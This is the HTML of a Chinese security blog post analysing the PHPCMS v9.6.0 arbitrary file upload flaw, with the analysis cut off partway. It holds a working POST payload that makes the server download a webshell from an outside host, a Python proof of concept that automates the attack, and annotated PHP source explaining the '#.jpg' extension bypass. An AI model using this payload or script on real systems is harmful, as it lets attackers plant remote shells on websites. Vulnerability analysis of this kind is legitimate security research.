@@ -1,0 +1,890 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/favicon.ico?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon.ico?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon.ico?v=5.1.4">
+
+
+
+
+
+
+  <meta name="keywords" content="代码审计,php,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="0x01 漏洞复现注册页面http://127.0.0.1/audit/phpcms/index.php?m=member&amp;amp;c=index&amp;amp;a=register&amp;amp;siteid=1 提交post数据，如下： 1siteid=1&amp;amp;modelid=1&amp;amp;username=123123123&amp;amp;password=123asdf456&amp;amp;email=1231">
+<meta name="keywords" content="代码审计,php">
+<meta property="og:type" content="article">
+<meta property="og:title" content="PHPCMS v9.6.0 任意文件上传漏洞分析">
+<meta property="og:url" content="http://21guns.top/2017/08/10/PHPCMS-v9-6-0-任意文件上传漏洞分析/index.html">
+<meta property="og:site_name" content="Ry1ynn&#39;s blogs">
+<meta property="og:description" content="0x01 漏洞复现注册页面http://127.0.0.1/audit/phpcms/index.php?m=member&amp;amp;c=index&amp;amp;a=register&amp;amp;siteid=1 提交post数据，如下： 1siteid=1&amp;amp;modelid=1&amp;amp;username=123123123&amp;amp;password=123asdf456&amp;amp;email=1231">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://ou8vctgrk.bkt.clouddn.com/17-8-10/54698372.jpg">
+<meta property="og:image" content="http://ou8vctgrk.bkt.clouddn.com/17-8-10/36468653.jpg">
+<meta property="og:image" content="http://ou8vctgrk.bkt.clouddn.com/17-8-10/73395338.jpg">
+<meta property="og:image" content="http://ou8vctgrk.bkt.clouddn.com/17-8-10/31830217.jpg">
+<meta property="og:image" content="http://ou8vctgrk.bkt.clouddn.com/17-8-10/64317462.jpg">
+<meta property="og:updated_time" content="2019-03-22T13:17:51.917Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="PHPCMS v9.6.0 任意文件上传漏洞分析">
+<meta name="twitter:description" content="0x01 漏洞复现注册页面http://127.0.0.1/audit/phpcms/index.php?m=member&amp;amp;c=index&amp;amp;a=register&amp;amp;siteid=1 提交post数据，如下： 1siteid=1&amp;amp;modelid=1&amp;amp;username=123123123&amp;amp;password=123asdf456&amp;amp;email=1231">
+<meta name="twitter:image" content="http://ou8vctgrk.bkt.clouddn.com/17-8-10/54698372.jpg">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://21guns.top/2017/08/10/PHPCMS-v9-6-0-任意文件上传漏洞分析/">
+
+
+
+
+
+  <title>PHPCMS v9.6.0 任意文件上传漏洞分析 | Ry1ynn's blogs</title>
+  
+
+
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Ry1ynn's blogs</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://21guns.top/2017/08/10/PHPCMS-v9-6-0-任意文件上传漏洞分析/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Ry1ynn">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Ry1ynn's blogs">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">PHPCMS v9.6.0 任意文件上传漏洞分析</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-08-10T18:44:11+08:00">
+                2017-08-10
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/代码审计/" itemprop="url" rel="index">
+                    <span itemprop="name">代码审计</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="0x01-漏洞复现"><a href="#0x01-漏洞复现" class="headerlink" title="0x01 漏洞复现"></a>0x01 漏洞复现</h1><p>注册页面<a href="http://127.0.0.1/audit/phpcms/index.php?m=member&amp;c=index&amp;a=register&amp;siteid=1" target="_blank" rel="noopener">http://127.0.0.1/audit/phpcms/index.php?m=member&amp;c=index&amp;a=register&amp;siteid=1</a></p>
+<p>提交post数据，如下：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">siteid=1&amp;modelid=1&amp;username=123123123&amp;password=123asdf456&amp;email=123123123qwe@qq.com&amp;info[content]=&lt;img src=http://files.hackersb.cn/webshell/antSword-shells/php_assert.php#.jpg&gt;&amp;dosubmit=1&amp;protocol=</span><br></pre></td></tr></table></figure>
+<p>页面会返回shell地址，菜刀连接即可；</p>
+<p><a href="http://ou8vctgrk.bkt.clouddn.com/17-8-10/54698372.jpg" target="_blank" rel="noopener"><img src="http://ou8vctgrk.bkt.clouddn.com/17-8-10/54698372.jpg" alt="img"></a></p>
+<a id="more"></a>
+<p>现提供一个简化的py版POC：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re  </span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">poc</span><span class="params">(url)</span>:</span>  </span><br><span class="line">    u = <span class="string">'&#123;&#125;/index.php?m=member&amp;c=index&amp;a=register&amp;siteid=1'</span>.format(url)</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">'siteid'</span>: <span class="string">'1'</span>,</span><br><span class="line">        <span class="string">'modelid'</span>: <span class="string">'1'</span>,</span><br><span class="line">        <span class="string">'username'</span>: <span class="string">'test'</span>,</span><br><span class="line">        <span class="string">'password'</span>: <span class="string">'testxx'</span>,</span><br><span class="line">        <span class="string">'email'</span>: <span class="string">'test@test.com'</span>,</span><br><span class="line">        <span class="string">'info[content]'</span>: <span class="string">'&lt;img src=http://url/shell.txt?.php#.jpg&gt;'</span>,</span><br><span class="line">        <span class="string">'dosubmit'</span>: <span class="string">'1'</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    rep = requests.post(u, data=data)</span><br><span class="line"></span><br><span class="line">    shell = <span class="string">''</span></span><br><span class="line">    re_result = re.findall(<span class="string">r'&amp;lt;img src=(.*)&amp;gt'</span>, rep.content)</span><br><span class="line">    <span class="keyword">if</span> len(re_result):</span><br><span class="line">        shell = re_result[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">print</span> shell</span><br></pre></td></tr></table></figure>
+<p>PS： 之所以说简化，是因为注册时用户名和邮箱有所限制，实际中应该随机生成，不应相同，后续代码分析中会提到；</p>
+<h1 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h1><p>根据注册页面url，模块为member，控制器为index，事件为register，定位到文件phpcmsv9/phpcms/modules/member/index.php，其中的register函数；</p>
+<p>代码会对post数据进行处理，相应位置下断点：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$_POST[<span class="string">'info'</span>] = array_map(<span class="string">'new_html_special_chars'</span>,$_POST[<span class="string">'info'</span>]);</span><br></pre></td></tr></table></figure>
+<p>new_html_special_chars函数处理，尖括号实例化；：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$user_model_info = $member_input-&gt;get($_POST[<span class="string">'info'</span>]);</span><br></pre></td></tr></table></figure>
+<p>进入get，继续跟进：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get</span><span class="params">($data)</span> </span>&#123;</span><br><span class="line">   <span class="keyword">$this</span>-&gt;data = $data = trim_script($data);</span><br><span class="line">   $model_cache = getcache(<span class="string">'member_model'</span>, <span class="string">'commons'</span>);</span><br><span class="line">   <span class="keyword">$this</span>-&gt;db-&gt;table_name = <span class="keyword">$this</span>-&gt;db_pre.$model_cache[<span class="keyword">$this</span>-&gt;modelid][<span class="string">'tablename'</span>];</span><br><span class="line"></span><br><span class="line">   $info = <span class="keyword">array</span>();</span><br><span class="line">   $debar_filed = <span class="keyword">array</span>(<span class="string">'catid'</span>,<span class="string">'title'</span>,<span class="string">'style'</span>,<span class="string">'thumb'</span>,<span class="string">'status'</span>,<span class="string">'islink'</span>,<span class="string">'description'</span>);</span><br><span class="line">   <span class="keyword">if</span>(is_array($data)) &#123;</span><br><span class="line">      <span class="keyword">foreach</span>($data <span class="keyword">as</span> $field=&gt;$value) &#123;</span><br><span class="line">         <span class="keyword">if</span>($data[<span class="string">'islink'</span>]==<span class="number">1</span> &amp;&amp; !in_array($field,$debar_filed)) <span class="keyword">continue</span>;</span><br><span class="line">         $field = safe_replace($field);</span><br><span class="line">         $name = <span class="keyword">$this</span>-&gt;fields[$field][<span class="string">'name'</span>];</span><br><span class="line">         $minlength = <span class="keyword">$this</span>-&gt;fields[$field][<span class="string">'minlength'</span>];</span><br><span class="line">         $maxlength = <span class="keyword">$this</span>-&gt;fields[$field][<span class="string">'maxlength'</span>];</span><br><span class="line">         $pattern = <span class="keyword">$this</span>-&gt;fields[$field][<span class="string">'pattern'</span>];</span><br><span class="line">         $errortips = <span class="keyword">$this</span>-&gt;fields[$field][<span class="string">'errortips'</span>];</span><br><span class="line">         <span class="keyword">if</span>(<span class="keyword">empty</span>($errortips)) $errortips = <span class="string">"$name 不符合要求！"</span>;</span><br><span class="line">         $length = <span class="keyword">empty</span>($value) ? <span class="number">0</span> : strlen($value);</span><br><span class="line">         <span class="keyword">if</span>($minlength &amp;&amp; $length &lt; $minlength &amp;&amp; !$isimport) showmessage(<span class="string">"$name 不得少于 $minlength 个字符！"</span>);</span><br><span class="line">         <span class="keyword">if</span> (!array_key_exists($field, <span class="keyword">$this</span>-&gt;fields)) showmessage(<span class="string">'模型中不存在'</span>.$field.<span class="string">'字段'</span>);</span><br><span class="line">         <span class="keyword">if</span>($maxlength &amp;&amp; $length &gt; $maxlength &amp;&amp; !$isimport) &#123;</span><br><span class="line">            showmessage(<span class="string">"$name 不得超过 $maxlength 个字符！"</span>);</span><br><span class="line">         &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            str_cut($value, $maxlength);</span><br><span class="line">         &#125;</span><br><span class="line">         <span class="keyword">if</span>($pattern &amp;&amp; $length &amp;&amp; !preg_match($pattern, $value) &amp;&amp; !$isimport) showmessage($errortips);</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;fields[$field][<span class="string">'isunique'</span>] &amp;&amp; <span class="keyword">$this</span>-&gt;db-&gt;get_one(<span class="keyword">array</span>($field=&gt;$value),$field) &amp;&amp; ROUTE_A != <span class="string">'edit'</span>) showmessage(<span class="string">"$name 的值不得重复！"</span>);</span><br><span class="line">         $func = <span class="keyword">$this</span>-&gt;fields[$field][<span class="string">'formtype'</span>];</span><br><span class="line">         <span class="keyword">if</span>(method_exists(<span class="keyword">$this</span>, $func)) $value = <span class="keyword">$this</span>-&gt;$func($field, $value);</span><br><span class="line"></span><br><span class="line">         $info[$field] = $value;</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> $info;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>进入trim_script函数，对script等关键字做了过滤，data无改变；</p>
+<p>又对其做了一些长度等乱七八糟的判断，继续往下走，</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$func = <span class="keyword">$this</span>-&gt;fields[$field][<span class="string">'formtype'</span>];</span><br><span class="line"><span class="keyword">if</span>(method_exists(<span class="keyword">$this</span>, $func)) $value = <span class="keyword">$this</span>-&gt;$func($field, $value);</span><br></pre></td></tr></table></figure>
+<p>此时$func=editor，再进入editor函数；</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">editor</span><span class="params">($field, $value)</span> </span>&#123;</span><br><span class="line">   $setting = string2array(<span class="keyword">$this</span>-&gt;fields[$field][<span class="string">'setting'</span>]);</span><br><span class="line">   $enablesaveimage = $setting[<span class="string">'enablesaveimage'</span>];</span><br><span class="line">   $site_setting = string2array(<span class="keyword">$this</span>-&gt;site_config[<span class="string">'setting'</span>]);</span><br><span class="line">   $watermark_enable = intval($site_setting[<span class="string">'watermark_enable'</span>]);</span><br><span class="line">   $value = <span class="keyword">$this</span>-&gt;attachment-&gt;download(<span class="string">'content'</span>, $value,$watermark_enable);</span><br><span class="line">   <span class="keyword">return</span> $value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>继续进入download函数，进行文件的下载，url的处理也在这；</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">download</span><span class="params">($field, $value,$watermark = <span class="string">'0'</span>,$ext = <span class="string">'gif|jpg|jpeg|bmp|png'</span>, $absurl = <span class="string">''</span>, $basehref = <span class="string">''</span>)</span>  </span></span><br><span class="line"><span class="function"></span>&#123;		<span class="comment">//限制了后缀名，$ext = 'gif|jpg|jpeg|bmp|png'</span></span><br><span class="line">    <span class="keyword">global</span> $image_d;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;att_db = pc_base::load_model(<span class="string">'attachment_model'</span>);</span><br><span class="line">    $upload_url = pc_base::load_config(<span class="string">'system'</span>,<span class="string">'upload_url'</span>);	<span class="comment">//获取了系统设置的上传路径；</span></span><br><span class="line">    <span class="keyword">$this</span>-&gt;field = $field;</span><br><span class="line">    $dir = date(<span class="string">'Y/md/'</span>);		<span class="comment">//当前时间</span></span><br><span class="line">    $uploadpath = $upload_url.$dir;		<span class="comment">//路径+以时间为基础的随机名字</span></span><br><span class="line">    $uploaddir = <span class="keyword">$this</span>-&gt;upload_root.$dir;	<span class="comment">//上传时的物理路径</span></span><br><span class="line">    $string = new_stripslashes($value);		  <span class="comment">//对value进行转义</span></span><br><span class="line">    <span class="keyword">if</span>(!preg_match_all(<span class="string">"/(href|src)=([\"|']?)([^ \"'&gt;]+\.($ext))\\2/i"</span>, $string, $matches)) <span class="keyword">return</span> $value;<span class="comment">//进行正则匹配，得到href的属性值；因为ext的限制，因此shell的后缀加上.jpg；</span></span><br><span class="line">    $remotefileurls = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">foreach</span>($matches[<span class="number">3</span>] <span class="keyword">as</span> $matche)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(strpos($matche, <span class="string">'://'</span>) === <span class="keyword">false</span>) <span class="keyword">continue</span>;</span><br><span class="line">        dir_create($uploaddir);		<span class="comment">//创建上传路径；</span></span><br><span class="line">        $remotefileurls[$matche] = <span class="keyword">$this</span>-&gt;fillurl($matche, $absurl, $basehref);		<span class="comment">//经过此函数，#后的.jpg会去掉，后缀变成.php</span></span><br><span class="line"> </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">unset</span>($matches, $string);</span><br><span class="line">    $remotefileurls = array_unique($remotefileurls);</span><br><span class="line">    $oldpath = $newpath = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">foreach</span>($remotefileurls <span class="keyword">as</span> $k=&gt;$file) &#123;</span><br><span class="line">        <span class="keyword">if</span>(strpos($file, <span class="string">'://'</span>) === <span class="keyword">false</span> || strpos($file, $upload_url) !== <span class="keyword">false</span>) <span class="keyword">continue</span>;</span><br><span class="line">        $filename = fileext($file);		<span class="comment">//得到最终保存到本地的php文件名（包含url路径）</span></span><br><span class="line">        $file_name = basename($file);		<span class="comment">//php文件名</span></span><br><span class="line">        $filename = <span class="keyword">$this</span>-&gt;getname($filename);</span><br><span class="line"></span><br><span class="line">        $newfile = $uploaddir.$filename;	<span class="comment">////得到最终保存到本地的php文件名（包含物理路径）</span></span><br><span class="line">        $upload_func = <span class="keyword">$this</span>-&gt;upload_func;		<span class="comment">//此时为copy函数</span></span><br><span class="line">        <span class="keyword">if</span>($upload_func($file, $newfile)) &#123;		<span class="comment">//copy函数，实现远程文件到本地的下载；</span></span><br><span class="line">            $oldpath[] = $k;</span><br><span class="line">            $GLOBALS[<span class="string">'downloadfiles'</span>][] = $newpath[] = $uploadpath.$filename;</span><br><span class="line">            @chmod($newfile, <span class="number">0777</span>);		<span class="comment">//改变文件权限；</span></span><br><span class="line">            $fileext = fileext($filename);	<span class="comment">//得到后缀名php</span></span><br><span class="line">            <span class="keyword">if</span>($watermark)&#123;</span><br><span class="line">                watermark($newfile, $newfile,<span class="keyword">$this</span>-&gt;siteid);</span><br><span class="line">            &#125;</span><br><span class="line">            $filepath = $dir.$filename;</span><br><span class="line">            $downloadedfile = <span class="keyword">array</span>(<span class="string">'filename'</span>=&gt;$filename, <span class="string">'filepath'</span>=&gt;$filepath, <span class="string">'filesize'</span>=&gt;filesize($newfile), <span class="string">'fileext'</span>=&gt;$fileext);</span><br><span class="line">            $aid = <span class="keyword">$this</span>-&gt;add($downloadedfile);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;downloadedfiles[$aid] = $filepath;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> str_replace($oldpath, $newpath, $value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>万恶的copy函数，</p>
+<table>
+<thead>
+<tr>
+<th>版本</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>5.3.0</td>
+<td>增加了对 context 的支持。</td>
+</tr>
+<tr>
+<td>4.3.0</td>
+<td>如果启用了”fopen wrappers”的话，<code>source</code> 和     <code>dest</code> 都可以是 URL。更多细节见 <a href="mk:@MSITStore:F:%5CLearning%5C%E5%B8%B8%E7%94%A8%E6%89%8B%E5%86%8C%5Cphp_manual_zh.chm::/res/function.fopen.html" target="_blank" rel="noopener">fopen()</a>。</td>
+</tr>
+</tbody>
+</table>
+<p>而<code>fopen</code>一般都是可用的，如果开启了<code>allow_url_fopen</code>，这个漏洞就构成了，然而大部分环境都默认开启了<code>allow_url_fopen</code>。</p>
+<p>其中，fillurl函数比较重要，部分代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fillurl</span><span class="params">($surl, $absurl, $basehref = <span class="string">''</span>)</span> </span>&#123;</span><br><span class="line">   <span class="keyword">if</span>($basehref != <span class="string">''</span>) &#123;</span><br><span class="line">      $preurl = strtolower(substr($surl,<span class="number">0</span>,<span class="number">6</span>));</span><br><span class="line">      <span class="keyword">if</span>($preurl==<span class="string">'http://'</span> || $preurl==<span class="string">'ftp://'</span> ||$preurl==<span class="string">'mms://'</span> || $preurl==<span class="string">'rtsp://'</span> || $preurl==<span class="string">'thunde'</span> || $preurl==<span class="string">'emule://'</span>|| $preurl==<span class="string">'ed2k://'</span>)</span><br><span class="line">      <span class="keyword">return</span>  $surl;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      <span class="keyword">return</span> $basehref.<span class="string">'/'</span>.$surl;</span><br><span class="line">   &#125;</span><br><span class="line">   $i = <span class="number">0</span>;</span><br><span class="line">   $dstr = <span class="string">''</span>;</span><br><span class="line">   $pstr = <span class="string">''</span>;</span><br><span class="line">   $okurl = <span class="string">''</span>;</span><br><span class="line">   $pathStep = <span class="number">0</span>;</span><br><span class="line">   $surl = trim($surl);		<span class="comment">//去空白字符</span></span><br><span class="line">   <span class="keyword">if</span>($surl==<span class="string">''</span>) <span class="keyword">return</span> <span class="string">''</span>;</span><br><span class="line">   $urls = @parse_url(SITE_URL);	<span class="comment">//解析 URL，返回其组成部分,在这返回相关数组</span></span><br><span class="line">   $HomeUrl = $urls[<span class="string">'host'</span>];		<span class="comment">//主机地址</span></span><br><span class="line">   $BaseUrlPath = $HomeUrl.$urls[<span class="string">'path'</span>];</span><br><span class="line">   $BaseUrlPath = preg_replace(<span class="string">"/\/([^\/]*)\.(.*)$/"</span>,<span class="string">'/'</span>,$BaseUrlPath);</span><br><span class="line">   $BaseUrlPath = preg_replace(<span class="string">"/\/$/"</span>,<span class="string">''</span>,$BaseUrlPath);</span><br><span class="line">   $pos = strpos($surl,<span class="string">'#'</span>);		<span class="comment">//查找#位置；</span></span><br><span class="line">   <span class="keyword">if</span>($pos&gt;<span class="number">0</span>) $surl = substr($surl,<span class="number">0</span>,$pos);		<span class="comment">//截取掉#及后面字符，后缀变成.php</span></span><br><span class="line">   <span class="keyword">if</span>($surl[<span class="number">0</span>]==<span class="string">'/'</span>) &#123;</span><br><span class="line">      $okurl = <span class="string">'http://'</span>.$HomeUrl.<span class="string">'/'</span>.$surl;</span><br><span class="line">   &#125; <span class="keyword">elseif</span>($surl[<span class="number">0</span>] == <span class="string">'.'</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span>(strlen($surl)&lt;=<span class="number">2</span>) <span class="keyword">return</span> <span class="string">''</span>;</span><br><span class="line">  .......</span><br><span class="line">  .......</span><br><span class="line">   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      $okurl = preg_replace(<span class="string">'/^(http:\/\/)/i'</span>,<span class="string">''</span>,$okurl);</span><br><span class="line">      $okurl = preg_replace(<span class="string">'/\/&#123;1,&#125;/i'</span>,<span class="string">'/'</span>,$okurl);</span><br><span class="line">      <span class="keyword">return</span> <span class="string">'http://'</span>.$okurl;		<span class="comment">//最终返回一个完整的合法的远程shell的url地址；</span></span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>此时，远程shell即下载到本地，只不过具体路径和文件名都是以日期和时间为基础，随机的。</p>
+<p>下面就要考虑shell地址的获取，两种主要思路，一时获取phpcms的通用上传路径后，再对日期和时间组成的文件名进行爆破处理；还有一种便是接下里insert时，使数据库报错得到；</p>
+<p>下载完成后，又回到register函数；</p>
